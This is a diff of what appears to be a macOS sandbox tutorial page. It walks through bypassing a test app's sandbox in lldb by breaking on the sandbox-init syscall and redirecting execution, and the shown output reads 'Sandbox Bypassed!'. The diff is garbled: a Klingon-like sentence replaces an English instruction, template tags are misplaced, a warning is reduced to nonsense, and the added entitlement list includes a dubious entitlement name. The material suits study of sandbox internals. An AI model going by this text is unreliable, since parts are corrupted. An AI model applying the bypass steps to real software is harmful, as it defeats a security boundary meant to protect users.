+This is an example of an entitlements.xml file used in macOS sandboxing. The file specifies the entitlements or permissions granted to an application running in a sandboxed environment. The entitlements define what resources and actions the application is allowed to access.
+
+In this example, the entitlements.xml file grants the following permissions:
+
+- `com.apple.security.app-sandbox`: Enables the application to run in a sandboxed environment.
+- `com.apple.security.network.client`: Allows the application to make network connections.
+- `com.apple.security.files.user-selected.read-write`: Grants read and write access to files selected by the user.
+- `com.apple.security.files.user-selected.read-only`: Grants read-only access to files selected by the user.
+- `com.apple.security.files.all`: Grants access to all files.
+- `com.apple.security.print`: Allows the application to print.
+- `com.apple.security.temporary-exception.apple-events`: Grants temporary exception for Apple events to the specified application (in this case, "com.apple.dt.Xcode").
+
+These entitlements help enforce security restrictions and prevent unauthorized access to sensitive resources.
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
 <dict>
@@ -207,16 +877,16 @@ int main() {
 </dict>
 </plist>
 ```
-{% endtab %}
-
 {% tab title="Info.plist" %}
+
+{% endtab %}
 ```xml
 <plist version="1.0">
 <dict>
-    <key>CFBundleIdentifier</key>
-    <string>xyz.hacktricks.sandbox</string>
-    <key>CFBundleName</key>
-    <string>Sandbox</string>
+<key>CFBundleIdentifier</key>
+<string>xyz.hacktricks.sandbox</string>
+<key>CFBundleName</key>
+<string>Sandbox</string>
 </dict>
 </plist>
 ```
@@ -241,13 +911,13 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 The app will try to **read** the file **`~/Desktop/del.txt`**, which the **Sandbox won't allow**.\
 Create a file in there as once the Sandbox is bypassed, it will be able to read it:
 
+{% endhint %}
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
 {% endhint %}
 
-Let's debug the application to see when is the Sandbox loaded:
-
+QaStaHvIS 'ej Sandbox loaded qaStaHvIS debugging application:
 ```bash
 # Load app in debugging
 lldb ./sand
@@ -263,11 +933,11 @@ lldb ./sand
 # We are looking for the one libsecinit from libSystem.B, like the following one:
 (lldb) bt
 * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
-  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
-    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
-    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
-    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
-    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272
+* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
+frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
+frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
+frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
+frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272
 
 # To avoid lldb cutting info
 (lldb) settings set target.max-string-summary-length 10000
@@ -278,8 +948,8 @@ lldb ./sand
 
 # The 3 arg is the address were the XPC response will be stored
 (lldb) register read x2
-  x2 = 0x000000016fdfd660
-  
+x2 = 0x000000016fdfd660
+
 # Move until the end of the function
 (lldb) finish
 
@@ -306,12 +976,12 @@ lldb ./sand
 # Due to the previous bp, the process will be stopped in:
 Process 2517 stopped
 * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
-    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
+frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
 libsystem_kernel.dylib`:
 ->  0x187659900 <+0>:  mov    x16, #0x17d
-    0x187659904 <+4>:  svc    #0x80
-    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
-    0x18765990c <+12>: pacibsp
+0x187659904 <+4>:  svc    #0x80
+0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
+0x18765990c <+12>: pacibsp
 
 # To bypass jump to the b.lo address modifying some registers first
 (lldb) breakpoint delete 1 # Remove bp
@@ -324,9 +994,8 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
-
 {% hint style="warning" %}
-**Even with the Sandbox bypassed TCC** will ask the user if he wants to allow the process to read files from desktop
+**Sandbox bypassed TCC** will ask the user if he wants to allow the process to read files from desktop
 {% endhint %}
 
 ## References
